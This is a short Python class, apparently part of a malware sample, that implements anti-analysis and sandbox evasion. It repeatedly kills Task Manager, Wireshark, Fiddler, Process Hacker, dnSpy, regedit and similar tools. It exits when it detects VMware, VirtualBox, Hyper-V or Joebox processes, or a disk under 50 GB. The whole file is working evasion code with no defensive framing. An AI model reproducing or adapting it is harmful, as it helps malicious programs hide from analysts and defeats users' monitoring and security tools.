class Antidebug:

    def __init__(self):
        self.stop = False
        t1 = Thread(target=self.antivm)
        t2 = Thread(target=self.disk)
        t3 = Thread(target=self.autoclose)
        t1.start();t2.start();t3.start()

    def autoclose(self):
        for _ in range(120):
            for p in psutil.process_iter():
                if any(procstr in p.name().lower() for procstr in ['taskmgr','process','processhacker','ksdumper','fiddler','httpdebuggerui','wireshark','httpanalyzerv7','fiddler','decoder','regedit','procexp','dnspy','vboxservice','burpsuit']):
                    try:p.kill()
                    except:pass
            sleep(1)
    
    def antivm(self):
        for p in psutil.process_iter():
            if any(procstr in p.name().lower() for procstr in ["vmwareservice", "vmwaretray","joeboxcontrol","vmwareuser","vmware","virtualbox","hyperv"]):
                self.stop = True
                os._exit(0)
    
    def disk(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824
        if diskSizeGB < minDiskSizeGB:
            try:
                self.stop = True
                os._exit(0)
            except:
                self.stop = True
                os._exit(1)